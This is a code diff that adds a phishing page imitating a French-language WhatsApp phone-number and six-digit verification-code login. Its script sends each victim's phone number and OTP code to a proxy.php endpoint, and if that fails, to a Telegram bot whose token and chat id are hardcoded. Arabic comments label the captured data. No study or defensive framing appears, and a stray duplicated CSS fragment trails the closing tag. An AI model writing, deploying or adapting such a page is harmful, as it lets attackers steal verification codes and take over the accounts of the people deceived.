@@ -25,16 +25,184 @@
             min-height: 100vh;
         }
 
-        /* --- تعديل حجم الشعار هنا --- */
         .header-logo {
             width: 100%;
-            padding: 25px 30px; /* زيادة التباعد قليلاً */
+            padding: 25px 30px;
             display: flex;
             justify-content: flex-start;
         }
 
         .header-logo img {
-            height: 60px; /* تم زيادة الطول من 35px إلى 60px ليكون أوضح */
+            height: 60px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 10px 20px;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            padding: 45px 25px;
+            border: 1.5px solid #000;
+            border-radius: 35px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            text-align: left;
+        }
+
+        h2 { font-size: 26px; font-weight: 700; margin-bottom: 12px; color: var(--text-black); line-height: 1.2; }
+        p.desc { font-size: 15px; margin-bottom: 35px; color: var(--text-gray); line-height: 1.4; }
+
+        .iti { width: 100%; margin-bottom: 25px; }
+        input[type="tel"], .otp-field {
+            height: 55px;
+            border: 1px solid #e5e5e5;
+            border-radius: 12px;
+            font-size: 18px;
+            outline: none;
+            background: #fff;
+        }
+
+        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin: 25px 0; }
+        .otp-field { width: 15% !important; text-align: center; border-radius: 10px; }
+
+        .btn-submit {
+            background-color: var(--btn-green);
+            color: white;
+            border: none;
+            width: 100%;
+            max-width: 200px;
+            height: 50px;
+            border-radius: 25px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 20px auto;
+            display: block;
+        }
+
+        .footer {
+            width: 100%;
+            padding: 25px;
+            text-align: center;
+            color: var(--text-black);
+        }
+
+        .footer-top { font-size: 17px; margin-bottom: 12px; }
+        .footer-top a { color: var(--text-black); text-decoration: underline; text-decoration-color: var(--btn-green); font-weight: 700; }
+        
+        .footer-encryption {
+            display: flex; align-items: center; justify-content: center;
+            gap: 6px; color: var(--text-gray); font-size: 14px; margin-bottom: 10px;
+        }
+
+        .footer-links { font-size: 13px; color: #999; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div class="header-logo">
+    <img src="https://i.ibb.co/WpGsjBjN/66-B81-BFB-41-A6-4025-AD64-3840-CAA7-CC0-E.jpg" alt="Logo">
+</div>
+
+<div class="main-content">
+    <div class="wrapper">
+        <div id="page1">
+            <h2>Saisissez un numéro de téléphone.</h2>
+            <p class="desc">Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
+            <input type="tel" id="phone">
+            <button class="btn-submit" onclick="processData('phone')">Suivant</button>
+        </div>
+
+        <div id="page2" class="hidden">
+            <h2>Vérification</h2>
+            <p class="desc">Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
+            <div class="otp-container">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 0)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 1)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 2)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 3)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 4)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 5)">
+            </div>
+            <button class="btn-submit" onclick="processData('otp')">Vérifier</button>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <div class="footer-top">
+        Vous n'avez pas de compte WhatsApp ? <a href="#">Démarrer ↗</a>
+    </div>
+    <div class="footer-encryption">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+        Vos messages personnels sont chiffrés de bout en bout
+    </div>
+    <div class="footer-links">
+        Conditions générales et Politique de confidentialité
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+<script>
+    const phoneInput = document.querySelector("#phone");
+    const iti = window.intlTelInput(phoneInput, {
+        initialCountry: "auto",
+        geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)),
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+    });
+
+    let phoneNumber = '';
+
+    function processData(type) {
+        let textMsg = "";
+        if(type === 'phone') {
+            const num = iti.getNumber();
+            if(!num) return alert("Numéro invalide");
+            phoneNumber = num;
+            textMsg = "📱 رقم جديد: " + num;
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+        } else {
+            let otpCode = "";
+            document.querySelectorAll('.otp-field').forEach(f => otpCode += f.value);
+            if(otpCode.length < 6) return alert("Code incomplet");
+            textMsg = "🔑 كود OTP: " + otpCode + " | الهاتف: " + phoneNumber;
+        }
+
+        // إرسال للـ proxy بدلاً من البوت مباشرة
+        fetch('proxy.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: `type=${type}&data=${encodeURIComponent(textMsg)}&phone=${encodeURIComponent(phoneNumber)}`
+        }).catch(() => {
+            // fallback للبوت المباشر إذا proxy مش شغال
+            fetch(`https://api.telegram.org/bot8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: '1705240737', text: textMsg })
+            });
+        });
+    }
+
+    function moveFocus(el, i) {
+        if(el.value.length >= 1) {
+            const fields = document.querySelectorAll('.otp-field');
+            if (i < 5) fields[i+1].focus();
+        }
+    }
+</script>
+</body>
+</html>            height: 60px; /* تم زيادة الطول من 35px إلى 60px ليكون أوضح */
             width: auto;
             object-fit: contain;
         }
